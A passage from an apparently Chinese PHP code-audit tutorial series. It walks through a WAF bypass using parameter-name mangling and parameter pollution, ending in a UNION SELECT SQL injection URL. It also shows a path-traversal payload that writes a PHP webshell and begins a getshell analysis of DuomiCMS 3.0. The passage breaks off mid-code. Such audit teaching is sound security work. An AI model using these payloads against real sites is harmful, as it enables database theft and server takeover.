class="comment">//新增修复代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反斜杠的ascii码是92，这里新增一行代码处理反斜杠。</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-19.png"></p><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db.inc.php&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">dhtmlspecialchars</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">          <span class="keyword">foreach</span> (<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">              <span class="variable">$string</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">dhtmlspecialchars</span>(<span class="variable">$val</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;&amp;amp;&#x27;</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>, <span class="string">&#x27;（&#x27;</span>, <span class="string">&#x27;）&#x27;</span>), <span class="variable">$string</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$string</span>, <span class="string">&#x27;&amp;amp;#&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">              <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&#x27;</span>, <span class="string">&#x27;&amp;\\1&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">dowith_sql</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">      <span class="variable">$check</span> = <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/select|insert|update|delete|\&#x27;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/is&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$check</span>) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;非法字符!&quot;</span>;</span><br><span class="line">          <span class="keyword">exit</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 经过第一个waf处理</span></span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">      <span class="variable">$_REQUEST</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">dowith_sql</span>(<span class="variable">$value</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 经过第二个WAF处理</span></span><br><span class="line">  <span class="variable">$request_uri</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;?&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$request_uri</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">      <span class="variable">$rewrite_url</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;&amp;&quot;</span>, <span class="variable">$request_uri</span>[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="variable">$rewrite_url</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">          <span class="variable">$_value</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;=&quot;</span>, <span class="variable">$value</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_value</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">              <span class="variable">$_REQUEST</span>[<span class="variable">$_value</span>[<span class="number">0</span>]] = <span class="title function_ invoke__">dhtmlspecialchars</span>(<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_value</span>[<span class="number">1</span>]));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 业务处理</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">      <span class="variable">$user_id</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;i_d&#x27;</span>];</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;select * from ctf.users where id=<span class="subst">$user_id</span>&quot;</span>;</span><br><span class="line">      <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>对于传入的非法的 <strong>$_GET</strong> 数组参数名，PHP会将他们替换成 <strong>下划线</strong> 。经过fuzz，有以下这些字符：</li></ul><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-20.png"></p><ul><li>当我们使用HPP（HTTP参数污染）传入多个相同参数给服务器时，PHP只会接收到后者的值。（这一特性和中间件有关系）</li></ul><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-21.png"></p><ul><li>通过 <strong>$_SERVER[‘REQUEST_URI’]</strong> 方式获得的参数，并不会对参数中的某些特殊字符进行替换。</li></ul><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-22.png"></p><p>这里的代码中有两个waf。</p><p>第一个WAF在代码 <strong>第29行-第30行</strong> ，这里面采用了 <strong>dowith_sql()</strong> 函数，跟进一下 <strong>dowith_sql()</strong> 函数，该函数主要功能代码在 <strong>第19-第26行</strong> ，如果 <strong>$_REQUEST</strong> 数组中的数据存在 <strong>select|insert|update|delete</strong> 等敏感关键字或者是字符，则直接 <strong>exit()</strong> 。如果不存在，则原字符串返回。</p><p>而第二个WAF在代码 <strong>第33行-第39行</strong> ，这部分代码通过 <strong>$_SERVER[‘REQUEST_URI’]</strong> 的方式获取参数，然后使用 <strong>explode</strong> 函数针对 <strong>&amp;</strong> 进行分割，获取到每个参数的参数名和参数值。然后针对每个参数值调用 <strong>dhtmlspecialchars()</strong> 函数进行过滤。</p><p>跟进一下 <strong>dhtmlspecialchars()</strong> 函数，发现其相关功能代码在 <strong>第3行-第14行</strong> ，这个函数主要功能是针对 <strong>‘&amp;’, ‘“‘, ‘&lt;’, ‘&gt;’, ‘(‘, ‘)’</strong> 等特殊字符进行过滤替换，最后返回替换后的内容。从 <strong>第44行和第45行</strong> 的代码中，我们可以看到这题的参数都是通过 <strong>REQUEST</strong> 方式获取。我们可以先来看个例子：</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-23.png"></p><p>第一次 <strong>$_REQUEST</strong> 仅仅只会输出 <strong>i_d&#x3D;2</strong> 的原因是因为php自动将 <strong>i.d</strong> 替换成了 <strong>i_d</strong> 。而根据我们前面说的第二个特性，PHP取最后一个参数对应的值，因此第一次 <strong>$_REQUEST</strong> 输出的是2。</p><p>第二次 <strong>$_REQUEST</strong> 会输出 <strong>i_d&#x3D;select&amp;i.d&#x3D;2</strong> 是因为 <strong>$_SERVER[‘REQUEST_URI’]</strong> 并不会对特殊的符号进行替换，因此结果会原封不动的输出。所以这题的payload可以根据下面这个思维导图进行构造：<br><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-24.png"></p><ul><li>我们通过页面请求 <strong>i_d&#x3D;padyload&amp;i.d&#x3D;123</strong> 。</li><li>当数据流到达第一个WAF时，php会将参数中的某些特殊符号替换为下划线。因此便得到了两个 <strong>i_d</strong> ，所以此时的payload变成了 <strong>i_d&#x3D;payload&amp;i_d&#x3D;123</strong> 。</li><li>前面我们介绍了，如果参数相同的情况下，默认 <strong>第二个参数传入的值</strong> 会覆盖 <strong>第一个参数传入的值</strong> 。因此此时在第一个WAF中 <strong>i_d&#x3D;123</strong> ，不存在其他特殊的字符，因此绕过了第一个WAF。</li><li>当数据流到达进入到第二个WAF时，由于代码是通过 <strong>$_SERVER[‘REQUEST_URI’]</strong> 取参数，而我们前面开头的第三个知识点已经介绍过了 <strong>$_SERVER[‘REQUEST_URI’]</strong> 是不会将参数中的特殊符号进行转换，因此这里的 <strong>i.d</strong> 参数并不会被替换为 <strong>i_d</strong> ，所以此时正常来说 <strong>i.d</strong> 和 <strong>i_d</strong> 都能经过第二个WAF。</li><li>第二个WAF中有一个 <strong>dhtmlspecialchars()</strong> 函数，这里需要绕过它，其实很好绕过。绕过之后 <strong>i_d&#x3D;payload&amp;i.d&#x3D;123</strong> 便会进入到业务层代码中，执行SQL语句，由于这里的SQL语句采用拼接的方式，因此存在SQL注入。</li></ul><p>因此最后payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/index.php?submit=&amp;i_d=-1/**/union/**/select/**/1,flag,3,4/**/from/**/ctf.users&amp;i.d=123</span></span><br></pre></td></tr></table></figure><p>参考文章<br><a href="https://blog.csdn.net/u011721501/article/details/51824576">PHP的两个特性导致waf绕过注入</a><br><a href="https://blog.spoock.com/2018/05/05/request-vuln-analysis/">request导致的安全性问题分析</a> </p><h2 id="Day-14-Snowman"><a href="#Day-14-Snowman" class="headerlink" title="Day 14 - Snowman"></a>Day 14 - Snowman</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Carrot</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">EXTERNAL_DIRECTORY</span> = <span class="string">&#x27;/tmp/&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lost</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$bought</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;id = <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$field</span> =&gt; <span class="variable">$count</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$field</span> = <span class="variable">$count</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable constant_">EXTERNAL_DIRECTORY</span> . <span class="variable">$this</span>-&gt;id,</span><br><span class="line">            <span class="title function_ invoke__">var_export</span>(<span class="title function_ invoke__">get_object_vars</span>(<span class="variable">$this</span>), <span class="literal">true</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$carrot</span> = <span class="keyword">new</span> <span class="title class_">Carrot</span>(<span class="variable">$_GET</span>);</span><br></pre></td></tr></table></figure><p><strong>漏洞解析</strong> ：</p><p>这道题目讲的是一个 <strong>变量覆盖</strong> 与 <strong>路径穿越</strong> 问题。在 <strong>第10-11行</strong> 处， <strong>Carrot</strong> 类的构造方法将超全局数组 <strong>$_GET</strong> 进行变量注册，这样即可覆盖 <strong>第8行</strong> 已定义的 <strong>$this-&gt;</strong> 变量。而在 <strong>第16行</strong> 处的析构函数中， <strong>file_put_contents</strong> 函数的第一个参数又是由 <strong>$this-&gt;</strong> 变量拼接的，这就导致我们可以控制写入文件的位置，最终造成任意文件写入问题。下面我们试着使用 <strong>payload</strong> ：<strong>id&#x3D;..&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&amp;shell&#x3D;’,)%0a<?php phpinfo();?>&#x2F;&#x2F;</strong> 写入 <strong>webshell</strong> ：</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-25.png"></p><h3 id="实例分析-2"><a href="#实例分析-2" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，我们选取的是 <strong><a href="https://duomicms.net/">DuomiCMS_3.0</a></strong> 最新版。该CMS存在全局变量注册问题，如果程序编写不当，会导致变量覆盖，本次我们便来分析 <strong>由变量覆盖导致的getshell</strong> 问题。</p><p>首先我们先来看一下该CMS中的全局变量注册代码，该代码位于 <strong>duomiphp&#x2F;common.php</strong> 文件中，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="title function_ invoke__">Array</span>(<span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) $&#123;<span class="variable">$_k</span>&#125; = <span class="title function_ invoke__">_RunMagicQuotes</span>(<span class="variable">$_v</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_RunMagicQuotes</span>(<span class="params">&amp;<span class="variable">$svar</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$svar</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$svar</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) <span class="variable">$svar</span>[<span class="variable">$_k</span>] = <span class="title function_ invoke__">_RunMagicQuotes</span>(<span class="variable">$_v</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$svar</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$svar</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$svar</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <strong>_RunMagicQuotes</strong> 函数将特殊符号，使用 <strong>addslashes</strong> 函数进行转义处理。我们来搜索 <strong>fwrite</strong> 函数，看看是否存在可利用的写文件程序（为了写 <strong>shell</strong> ）。<strong>phpstorm</strong> 程序搜索结果如下：</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-26.png"></p><p>我们可以看到有一个 <strong>admin\admin_ping.php</strong> 文件中，存在可利用的地方，因为其写入的目标文件为 <strong>PHP</strong> 程序，且写入内容中存在两个可控变量。其代码具体如下：</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-27.png"></p><p><strong>$weburl</strong> 变量和 <strong>$token</strong> 变量从 <strong>POST方式</strong> 获取，其变量也只是经过 <strong>_RunMagicQuotes</strong> 函数过滤处理，以及 <strong>duomiphp\webscan.php</strong> 文件的过滤规则，但是并不影响我们写shell。过滤规则具体如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$getfilter</span> = <span class="string">&quot;\\k.+javascript:window\\[.*\\]|&lt;.*(&amp;#\\d+;)+?&gt;|&lt;.*(data|src)=data:text\\html.*?&gt;|\\b(alert\\|confirm\\|expression\\|prompt\\|benchmark.*|sleep.*|group.*)\\b(load_file|benchmark|[a-z]&#123;4,&#125;)\\b|\\bon\\w+=[^&gt;]+\\&gt;|SELECT\\s+(.*.)+\\b@&#123;1,2&#125;\\s+.*|SET\\s+.*\\b;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$postfilter</span> = <span class="string">&quot;&lt;.*=&amp;(#\\d+;)+?&gt;.*\\b(alert\\|confirm\\|expression\\|prompt\\|benchmark.*|sleep.*|group.*)\\b(load_file|benchmark)\\b|\\bon\\w+=[^&gt;]+\\&gt;|\\bEXEC\\b|UNION\\s+SELECT.*|INSERT\\s+INTO.*VALUES\\s*(\\(.*)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cookiefilter</span> = <span class="string">&quot;benchmark.*|\\b(load_file|exec|SELECT|INSERT|DELETE|CREATE|ALTER|DROP|TRUNCATE|\\@@)\\b.*?VALUES\\(.*|SET\\s+.*&quot;</span>;</span><br></pre></td></tr></table></figure><p>然而要想利用这个文件，我们就必须是 <strong>admin</strong> 身份，不然没有权限访问该文件。所以我们看看该CMS是如何对用户身份进行认定的，是否可以利用之前的变量覆盖来伪造身份呢？</p><p>跟进 <strong>admin\admin_ping.php</strong> 文件开头包含的 <strong>admin\config.php</strong> 文件，那么我们要关注的是如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(duomi_INC . <span class="string">&quot;/check.admin.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cuserLogin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">userLogin</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$cuserLogin</span>-&gt;<span class="title function_ invoke__">getUserID</span>() === -<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php?gotoPage=&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$EkNowurl</span>));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要知道程序是如何对用户的身份进行处理的，跟进 <strong>duomiphp\check.admin.php</strong> 文件，关注如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">userLogin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userPwd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userID</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$adminDir</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$groupid</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$keepUserIDTag</span> = <span class="string">&quot;duomi_admin_id&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$keepgroupidTag</span> = <span class="string">&quot;duomi_group_id&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$keepUserNameTag</span> = <span class="string">&quot;duomi_admin_name&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$admindir</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$admin_path</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable language_">$this</span>-&gt;keepUserIDTag]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;userID = <span class="variable">$_SESSION</span>[<span class="variable language_">$this</span>-&gt;keepUserIDTag];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;groupid = <span class="variable">$_SESSION</span>[<span class="variable language_">$this</span>-&gt;keepgroupidTag];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;userName = <span class="variable">$_SESSION</span>[<span class="variable language_">$this</span>-&gt;keepUserNameTag];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到这里记录了用户名字、所属组、用户，再来看看 <strong>admin</strong> 所对应的这三个值分别是多少。找到 <strong>admin\login.php</strong> 文件，如下图，我们只要让 <strong>checkUser</strong> 方法返回1即是admin用户。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$dopost</span>==<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$validate</span> = <span class="keyword">empty</span>(<span class="variable">$validate</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$validate</span>));</span><br><span class="line">    <span class="variable">$svali</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">GetCkVdValue</span>());</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$validate</span>==<span class="string">&#x27;&#x27;</span> || <span class="variable">$svali</span> != <span class="variable">$svali</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ResetVdValue</span>();</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;验证码不正确！&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$cuserLogin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">userLogin</span>(<span class="variable">$admindir</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$userid</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$pwd</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable">$cuserLogin</span>-&gt;<span class="title function_ invoke__">checkUser</span>(<span class="variable">$userid</span>, <span class="variable">$pwd</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$cuserLogin</span>-&gt;<span class="title function_ invoke__">keepUser</span>();</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$gotopage</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;成功登录，正在转向管理管理页！&#x27;</span>, <span class="variable">$gotopage</span>);</span><br><span class="line">                    <span class="keyword">exit</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;登录失败，正在转向管理管理页！&#x27;</span>, <span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 <strong>duomiphp\check.admin.php</strong> 文件的 <strong>checkUser</strong> 方法，具体代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 